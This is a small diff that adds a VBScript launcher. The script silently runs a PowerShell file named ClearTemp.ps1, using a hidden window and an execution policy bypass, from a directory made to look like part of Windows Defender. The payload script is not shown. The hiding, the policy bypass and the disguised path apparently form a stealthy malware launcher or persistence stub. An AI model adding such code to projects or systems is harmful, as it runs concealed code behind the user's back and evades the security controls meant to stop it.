@@ -1,0 +1,3 @@
+Dim objShell
+Set objShell=CreateObject("Wscript.Shell")
+objShell.run("powershell.exe -windowstyle hidden -ex bypass -f C:\Windows\SystemApps\Microsoft.Windows.Defender_cw5n1h2txyewy\ClearTemp.ps1"), 0
